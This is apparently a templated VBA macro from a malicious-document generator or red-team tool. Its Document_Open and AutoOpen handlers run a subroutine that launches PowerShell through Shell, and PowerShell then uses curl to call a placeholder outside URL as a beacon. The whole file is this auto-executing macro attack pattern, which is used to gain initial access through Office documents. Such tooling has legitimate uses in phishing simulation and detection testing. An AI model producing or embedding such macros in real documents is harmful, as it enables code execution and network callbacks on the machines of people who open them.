Sub {MACRO_NAME}()
    Dim str As String
    str = "powershell -NoExit -Command ""curl {HTTP_URL}/___hello_from_vbaShell_via_curl_via_PS___"" "
    Shell str, vbNormalFocus
End Sub

Sub Document_Open()
    {MACRO_NAME}
End Sub

Sub AutoOpen()
    {MACRO_NAME}
End Sub